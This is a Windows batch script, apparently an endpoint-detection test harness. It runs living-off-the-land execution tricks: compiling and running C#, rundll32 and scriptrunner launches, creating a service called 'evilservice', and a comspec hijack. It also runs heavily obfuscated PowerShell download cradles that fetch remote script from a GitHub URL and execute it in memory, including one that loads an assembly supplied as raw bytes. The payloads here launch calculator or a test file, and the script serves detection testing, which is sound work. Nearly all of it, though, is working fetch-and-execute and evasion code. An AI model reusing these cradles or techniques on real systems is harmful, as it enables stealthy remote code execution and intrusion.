start "" cmd /c  C:\Windows\Microsoft.NET\Framework\v4.0.30319\Csc.exe /out:payload.exe payload.cs
start "" cmd /c  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Csc.exe /out:payload.exe payload.cs
start "" cmd /c  payload.exe
echo Execution Finished at %time% %date%
echo Command Excuted: public class x{public static void Main(){System.Diagnostics.Process.Start("calc");}} >>  payload.cs
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:payload.exe payload.cs
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /out:payload.exe payload.cs
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v4.0.30319\Csc.exe /out:payload.exe payload.cs
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Csc.exe /out:payload.exe payload.cs
echo Command Excuted: payload.exe 
timeout 5
echo %time% %date% [+] Testing advpack exec
start "" cmd /c rundll32.exe advpack.dll,RegisterOCX calc.exe
echo Execution Finished at %time% %date%
echo Command Excuted: rundll32.exe advpack.dll,RegisterOCX calc.exe
timeout 5
echo %time% %date% [+] Testing Scriptrunner exec
start "" cmd /c scriptrunner.exe -appvscript calc.exe   
echo Execution Finished at %time% %date%
echo Command Excuted: scriptrunner.exe -appvscript calc.exe

timeout 5

echo %time% %date% [+] Testing SC exec
start "" cmd /c sc create evilservice binPath= "C:\windows\system32\calc.exe" DisplayName= "evilservice" start= auto     
start "" cmd /c sc start evilservice     
echo Execution Finished at %time% %date%
echo Command Excuted: sc create evilservice binPath= "C:\windows\system32\cmd.exe /c calc.exe" DisplayName= "evilservice" start= auto  
echo Command Excuted: sc start evilservice

timeout 5

echo %time% %date% [+] Testing Register-cimprovider exec
start "" cmd /c Register-cimprovider -path "AllTheThings.dll"   
echo Execution Finished at %time% %date%
echo Command Excuted: Register-cimprovider -path "AllTheThings.dll"   

timeout 5

echo %time% %date% [+] Testing control.exe exec
start "" cmd /c control.exe AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: control.exe AllTheThings.dll


timeout 5

echo %time% %date% [+] Testing manage-bde.wsf exec
set comspec=C:\windows\system32\calc.exe
start "" cmd /c cscript C:\windows\system32\manage-bde.wsf 
echo Execution Finished at %time% %date%
echo Command Excuted: set comspec=C:\windows\system32\calc.exe
echo Command Excuted: cscript C:\windows\system32\manage-bde.wsf 
REM Reset ComSpec
set comspec=C:\WINDOWS\system32\cmd.exe

REM ---- EOF LOLBAS Payloads ----

echo **********************************************
echo *    Testing Invoke-CradleCrafter PAYLOADS   *
echo **********************************************

REM Payloads in this section were generated using https://github.com/danielbohannon/Invoke-CradleCrafter.

echo %time% %date% [+] Testing MEMORY\PSWEBSTRING exec
start "" cmd /c powershell -c "Set-Item Variable:\FW 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';dir ect*;SI Variable:/d (.(LS Variable:/E*tex*).Value.(((LS Variable:/E*tex*).Value|Get-Member)[6].Name).(((LS Variable:/E*tex*).Value.(((LS Variable:/E*tex*).Value|Get-Member)[6].Name).PsObject.Methods|Where{(ChildItem Variable:/_).Value.Name-ilike'*Co*d'}).Name).Invoke((LS Variable:/E*tex*).Value.(((LS Variable:/E*tex*).Value|Get-Member)[6].Name).(((LS Variable:/E*tex*).Value.(((LS Variable:/E*tex*).Value|Get-Member)[6].Name)|Get-Member|Where{(ChildItem Variable:/_).Value.Name-ilike'*man*Name'}).Name).Invoke('*w-*ct',$TRUE,$TRUE),[Management.Automation.CommandTypes]::Cmdlet)Net.WebClient);(LS Variable:/E*tex*).Value.(((LS Variable:/E*tex*).Value|Get-Member)[6].Name).(((LS Variable:/E*tex*).Value.(((LS Variable:/E*tex*).Value|Get-Member)[6].Name)|Get-Member|Where{(ChildItem Variable:/_).Value.Name-ilike'I*t'}).Name).Invoke((Variable d -Va).((((Variable d -Va)|Get-Member)|Where{(ChildItem Variable:/_).Value.Name-ilike'*wn*g'}).Name).Invoke((Get-Item Variable:/FW).Value))" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\PSWEBDATA exec
start "" cmd /c powershell -c "dir ect*;SV j8 (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Member|?{$_.Name-like'*nd*e'}).Name).Invoke('Ne*ct',$TRUE,$TRUE))Net.WebClient);Set-Variable z 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';[ScriptBlock]::Create(([String]::Join('',(((Get-Variable j8 -ValueOn).((((Get-Variable j8 -ValueOn)|Member)|?{$_.Name-like'D*a'}).Name).Invoke((Variable z -ValueOnl))|%{$_-As'Char'}))))).Invoke()" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\PSWEBOPENREAD exec
start "" cmd /c powershell -c "$wr=(New-Object Net.WebClient);$url='https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';$sr=New-Object IO.StreamReader($wr.OpenRead($url));$res=$sr.ReadToEnd();$sr.Close();$res" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\NETWEBSTRING exec
start "" cmd /c powershell -c "([System.Net.WebClient]::New().DownloadString('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt'))" 
echo Execution Finished at %time% %date%

timeout 5

echo %time% %date% [+] Testing MEMORY\NETWEBDATA exec
start "" cmd /c powershell -c "Set-Variable Q 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';SI Variable:/V0r ([Net.WebClient]::New());SV MAI (((((GV V0r).Value|Member)|?{(ChildItem Variable:/_).Value.Name-like'*wn*a'}).Name));&([ScriptBlock]::Create(([System.String]::Join('',(((GV V0r).Value.((GI Variable:\MAI).Value)((GV Q).Value)|ForEach{(GI Variable:\_).Value-As'Char'}))))))" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\NETWEBOPENREAD exec
start "" cmd /c powershell -c "Set-Variable RsL ([Net.WebClient]::New());SV 7SW 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';Set-Variable RsL (LS Variable:RsL).Value.((((LS Variable:RsL).Value|Member)|Where-Object{(Variable _).Value.Name-ilike'*ad'}).Name)((Variable 7SW -Va));Set-Variable UR '';Try{While((Get-Item Variable:UR).Value+=[Char](LS Variable:RsL).Value.ReadByte()){}}Catch{};[ScriptBlock]::Create((Get-Item Variable:UR).Value).InvokeReturnAsIs()" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\PSWEBREQUEST exec
start "" cmd /c powershell -c "Set-Item Variable:/c 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';[ScriptBlock]::Create((((Get-Item Variable:c).Value|ForEach-Object{(.(Get-Variable E*tex*).Value.InvokeCommand.(((Get-Variable E*tex*).Value.InvokeCommand|Get-Member|Where{$_.Name-clike'*t*a*d'}).Name)((Get-Variable E*tex*).Value.InvokeCommand.(((Get-Variable E*tex*).Value.InvokeCommand.PsObject.Methods|Where{$_.Name-clike'*nd*e'}).Name)('In*k*t',$TRUE,$TRUE),[Management.Automation.CommandTypes]::Cmdlet) $_)})|ForEach-Object{$_.(($_|Get-Member)[4].Name).Invoke()})).Invoke()" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\PSRESTMETHOD exec
start "" cmd /c powershell -c "SI Variable:50a 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';Set-Variable Z ((Get-ChildItem Variable:50a).Value|ForEach-Object{(.$ExecutionContext.(($ExecutionContext|GM)[6].Name).GetCommand($ExecutionContext.(($ExecutionContext|GM)[6].Name).(($ExecutionContext.(($ExecutionContext|GM)[6].Name)|GM|Where-Object{(Variable _ -Va).Name-like'*man*Name'}).Name)('*-Re*d',1,1),[Management.Automation.CommandTypes]::Cmdlet) (Variable _ -Va))});IEX (GV Z -ValueO)" 
echo Execution Finished at %time% %date% 
timeout 5

echo %time% %date% [+] Testing MEMORY\NETWEBREQUEST exec
start "" cmd /c powershell -c "SI Variable:\UB ([Net.HttpWebRequest]::Create('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt').GetResponse().GetResponseStream());Set-Variable AZe '';Try{While((Variable AZe).Value+=[Char](Variable UB).Value.ReadByte()){}}Catch{};[ScriptBlock]::Create((Variable AZe).Value).Invoke()" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\PSSENDKEYS execs
start "" cmd /c powershell -c "ls _-*;Set-Item Variable:/O (&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*m*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'G*om*e'}).Name).Invoke('N*-O*',1,1))-ComObj WScript.Shell);Set-Item Variable:/l 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';Set-Variable fN 'HKCU:\Software\Microsoft\Notepad';SI Variable:\76 'Notepad';$Null=[System.Reflection.Assembly]::([System.Reflection.Assembly].GetMethods()|Where-Object{$_.Name-like'L*ame'}|ForEach{(LS Variable:\_).Value.Name}|Select  -Firs 1).Invoke('System.Windows.Forms');Set-Variable 5M (&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('G*em*y')(Item Variable:\fN).Value);@(@(((&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('G*em*y')HKCU:\Software\Microsoft\Notepad|Get-Member)[14].Name),0),@(((&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('G*em*y')HKCU:\Software\Microsoft\Notepad|Get-Member)[8].Name),([String]([Windows.Forms.Screen]::AllScreens)).Split('=')[5].Split('}')[0]))|ForEach{&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('S*-Ite*y')(Item Variable:\fN).Value $_[0] (LS Variable:\_).Value[1]};SV yda (Get-Variable O -Val).(((Get-Variable O -Val)|Get-Member)[2].Name).Invoke((Item Variable:76).Value).ProcessID;SI Variable:\J $Null;While(!((Get-Variable J).Value)){SI Variable:\J (Process|Where-Object{$_.id-ceq(ChildItem Variable:yda).Value}|ForEach{(LS Variable:\_).Value.MainWindowTitle});&($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*m*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'G*om*e'}).Name).Invoke('*t-Sl*',1,$TRUE)))-Milli 500};While(!(Get-Variable O -Val).(((Get-Variable O -Val)|Get-Member)[0].Name).Invoke((Get-Variable J).Value)){&($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*m*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'G*om*e'}).Name).Invoke('*t-Sl*',1,$TRUE)))-Milli 500};(Get-Variable O -Val).(((Get-Variable O -Val)|Get-Member)[10].Name).Invoke('^o');&($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*m*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'G*om*e'}).Name).Invoke('*t-Sl*',1,$TRUE)))-Milli 500;@((Get-Variable l -ValueOnl),(' '*1000),'~')|ForEach{(Get-Variable O -Val).(((Get-Variable O -Val)|Get-Member)[10].Name).Invoke((LS Variable:\_).Value)};SI Variable:q $Null;While((Item Variable:\q).Value.Length -lt 2){[System.Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{(Get-Variable O -Val).(((Get-Variable O -Val)|Get-Member)[10].Name).Invoke($_)};&($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*m*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'G*om*e'}).Name).Invoke('*t-Sl*',1,$TRUE)))-Milli 500;SI Variable:q ([System.Windows.Forms.Clipboard]::([System.Windows.Forms.Clipboard].GetMethods()[16].Name).Invoke())};[System.Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{(Get-Variable O -Val).(((Get-Variable O -Val)|Get-Member)[10].Name).Invoke((LS Variable:\_).Value)};If(Process|Where-Object{$_.id-ceq(ChildItem Variable:yda).Value}){@('{TAB}','~')|ForEach{(Get-Variable O -Val).(((Get-Variable O -Val)|Get-Member)[10].Name).Invoke($_)}};@(((&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('G*em*y')HKCU:\Software\Microsoft\Notepad|Get-Member)[7].Name),((&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('G*em*y')HKCU:\Software\Microsoft\Notepad|Get-Member)[14].Name),((&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('G*em*y')HKCU:\Software\Microsoft\Notepad|Get-Member)[6].Name),((&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('G*em*y')HKCU:\Software\Microsoft\Notepad|Get-Member)[8].Name),((&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('G*em*y')HKCU:\Software\Microsoft\Notepad|Get-Member)[5].Name))|ForEach{&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*lets'}).Name).Invoke('S*-Ite*y')(Item Variable:\fN).Value $_ (GCI Variable:5M).Value.((LS Variable:\_).Value)};(Item Variable:\q).Value|&$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'*m*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|Get-Member|Where-Object{$_.Name-like'G*om*e'}).Name).Invoke('*e-*press*',1,1))" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\PSCOMWORD exec
start "" cmd /c powershell -c "gdr -*;Set-Item Variable:8 (&$ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name)|Member)[2].Name).Invoke($ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name).PsObject.Methods|?{$_.Name-like'*Com*e'}).Name).Invoke('*w-*ct',$TRUE,$TRUE))-C Word.Application);While((Get-Variable 8 -ValueOn).(((Get-Variable 8 -ValueOn)|Member|?{$_.Name-like'*sy'}).Name)){&($ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name)|Member|?{$_.Name-like'*d'}).Name).Invoke($ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name).PsObject.Methods|?{$_.Name-like'*Com*e'}).Name).Invoke('*t-Sl*',1,$TRUE),[Management.Automation.CommandTypes]::Cmdlet))-Mil 1000}(Get-Variable 8 -ValueOn).(((Get-Variable 8 -ValueOn)|Member)[420].Name)=(Get-Variable Fal* -Value);SV xz (Get-Variable 8 -ValueOn).(((Get-Variable 8 -ValueOn)|Member|?{$_.Name-like'D*cu*ts'}).Name).(((Get-Variable 8 -ValueOn).(((Get-Variable 8 -ValueOn)|Member|?{$_.Name-like'D*cu*ts'}).Name).PsObject.Members|?{$_.Name-like'O*n'}).Name).Invoke('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt');While((Get-Variable 8 -ValueOn).(((Get-Variable 8 -ValueOn)|Member|?{$_.Name-like'*sy'}).Name)){&($ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name)|Member|?{$_.Name-like'*d'}).Name).Invoke($ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name).PsObject.Methods|?{$_.Name-like'*Com*e'}).Name).Invoke('*t-Sl*',1,$TRUE),[Management.Automation.CommandTypes]::Cmdlet))-Mil 1000}(ChildItem Variable:/xz).Value.(((ChildItem Variable:/xz).Value|Member)[205].Name).(((ChildItem Variable:/xz).Value.(((ChildItem Variable:/xz).Value|Member)[205].Name)|Member)[172].Name)|.(COMMAND *-Ex*n);(Get-Variable 8 -ValueOn).Quit();[Void][System.Runtime.InteropServices.Marshal]::ReleaseComObject((Get-Variable 8 -ValueOn))" 
echo Execution Finished at %time% %date% 
timeout 5

echo %time% %date% [+] Testing MEMORY\PSCOMEXCEL exec
start "" cmd /c powershell -c "$comExcel=New-Object -ComObject Excel.Application;While($comExcel.Busy){Start-Sleep -Seconds 1}$comExcel.DisplayAlerts=$False;$Null=$comExcel.Workbooks.Open('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt');While($comExcel.Busy){Start-Sleep -Seconds 1}(($comExcel.Sheets.Item(1).Range(\"A1:Q\"+$comExcel.Sheets.Item(1).UsedRange.Rows.Count).Value2|?{(LS Variable:_).Value})-Join\"`n\");$comExcel.Quit();[Void][System.Runtime.InteropServices.Marshal]::ReleaseComObject($comExcel)" 
echo Execution Finished at %time% %date% 
timeout 5

echo %time% %date% [+] Testing MEMORY\PSCOMIE exec
start "" cmd /c powershell -c "popd;Set-Variable 9Z (&$ExecutionContext.(($ExecutionContext|GM)[6].Name).GetCommand($ExecutionContext.(($ExecutionContext|GM)[6].Name).GetCommandName('Ne*ct',1,1),[System.Management.Automation.CommandTypes]::Cmdlet)-Co InternetExplorer.Application -Pro @{Silent=(Get-Variable Tr*).Value;Visible=(Get-ChildItem Variable:/Fal*).Value;Navigate='https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt'});While((Variable 9Z -Val).(((Variable 9Z -Val)|GM|Where{$_.Name-ilike'Bu*y'}).Name)){&($ExecutionContext.(($ExecutionContext|GM)[6].Name).(($ExecutionContext.(($ExecutionContext|GM)[6].Name)|GM|Where{$_.Name-ilike'*m*ts'}).Name).Invoke('*t-S*p'))1}IEX (Variable 9Z -Val).(((Variable 9Z -Val)|GM|Where{$_.Name-ilike'*ment'}).Name).(((Variable 9Z -Val).(((Variable 9Z -Val)|GM|Where{$_.Name-ilike'*ment'}).Name)|GM|Where{$_.Name-ilike'b*y'}).Name).(((Variable 9Z -Val).(((Variable 9Z -Val)|GM|Where{$_.Name-ilike'*ment'}).Name).(((Variable 9Z -Val).(((Variable 9Z -Val)|GM|Where{$_.Name-ilike'*ment'}).Name)|GM|Where{$_.Name-ilike'b*y'}).Name)|GM|Where{$_.Name-ilike'o*Text'}).Name);(Variable 9Z -Val).Quit();[Void][Runtime.InteropServices.Marshal]::ReleaseComObject((Variable 9Z -Val))" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\PSCOMMSXML exec
start "" cmd /c powershell -c "ls _-*;SI Variable:/2 (&(Get-Variable E*ext -ValueO).(((Get-Variable E*ext -ValueO)|GM)[6].Name).(((Get-Variable E*ext -ValueO).(((Get-Variable E*ext -ValueO)|GM)[6].Name)|GM|Where{(DIR Variable:/_).Value.Name-like'*and'}).Name).Invoke((Get-Variable E*ext -ValueO).(((Get-Variable E*ext -ValueO)|GM)[6].Name).(((Get-Variable E*ext -ValueO).(((Get-Variable E*ext -ValueO)|GM)[6].Name).PsObject.Methods|Where{(DIR Variable:/_).Value.Name-like'*man*Name'}).Name).Invoke('N*-O*',1,1),[Management.Automation.CommandTypes]::Cmdlet)-ComOb MsXml2.ServerXmlHttp);(ChildItem Variable:\2).Value.(((ChildItem Variable:\2).Value|GM)[4].Name)('GET','https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt',(Get-ChildItem Variable:F*a*e).Value);(ChildItem Variable:\2).Value.(((ChildItem Variable:\2).Value|GM)[5].Name)();&(Get-Variable E*ext -ValueO).(((Get-Variable E*ext -ValueO)|GM)[6].Name).(((Get-Variable E*ext -ValueO).(((Get-Variable E*ext -ValueO)|GM)[6].Name)|GM|Where{(DIR Variable:/_).Value.Name-like'*let'}).Name).Invoke((Get-Variable E*ext -ValueO).(((Get-Variable E*ext -ValueO)|GM)[6].Name).(((Get-Variable E*ext -ValueO).(((Get-Variable E*ext -ValueO)|GM)[6].Name).PsObject.Methods|Where{(DIR Variable:/_).Value.Name-like'*man*Name'}).Name).Invoke('I*e-E*',1,$TRUE))(ChildItem Variable:\2).Value.(((ChildItem Variable:\2).Value|GM)[16].Name)" 
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing MEMORY\PSINLINECSHARP exec
start "" cmd /c powershell -c "SI Variable:\x 'public class Xlqndampcv{public static string IGJnkoBiM(string url){return (new System.Net.WebClient()).DownloadString(url);}}';dir ty*;.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|Where{$_.Name-ilike'*ts'}).Name).Invoke('A*-T*p*e')-Lang CSharp (Variable x).Value;Set-Item Variable:\0 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';.(GAL I*X)(([Xlqndampcv]::IGJnkoBiM((ChildItem Variable:0).Value)))" 
echo Execution Finished at %time% %date% 
timeout 5

echo %time% %date% [+] Testing MEMORY\PSCOMPILEDCSHARP exec
start "" cmd /c powershell -c "[Void][System.Reflection.Assembly]::Load([Byte[]](@(77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0,184)+@(0)*7+@(64)+@(0)*35+@(128,0,0,0,14,31,186,14,0,180,9,205,33,184,1,76,205,33,84,104,105,115,32,112,114,111,103,114,97,109,32,99,97,110,110,111,116,32,98,101,32,114,117,110,32,105,110,32,68,79,83,32,109,111,100,101,46,13,13,10,36)+@(0)*7+@(80,69,0,0,76,1,3,0,126,189,77,91)+@(0)*8+@(224,0,2,33,11,1,11,0,0,4,0,0,0,6,0,0,0,0,0,0,110,35,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(32,35,0,0,75,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,116,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(80,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,168,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,204,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,68,2,0,0,8,0,0,0,35,85,83,0,76,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,92,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,43,0,36,0,6,0,99,0,67,0,6,0,131,0,67,0,10,0,179,0,168,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,50,0,10,0,1,0,109,32,0,0,0,0,134,24,57,0,15,0,2,0,0,0,1,0,63,0,17,0,57,0,19,0,25,0,57,0,15,0,33,0,57,0,15,0,33,0,189,0,24,0,9,0,57,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(161,0,0,0,4)+@(0)*11+@(1,0,27,0,0,0,0,0,4)+@(0)*11+@(1,0,36)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,67,108,97,115,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,77,101,116,104,111,100,0,46,99,116,111,114,0,117,114,108,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,3,32,0,0,0,0,0,103,95,116,171,97,113,148,66,141,34,197,250,155,72,85,140,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,72,35)+@(0)*8+@(0,0,94,35,0,0,0,32)+@(0)*22+@(80,35)+@(0)*8+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*154+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,112,51)+@(0)*502));([Class]::Method('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt'))" 
echo Execution Finished at %time% %date% 
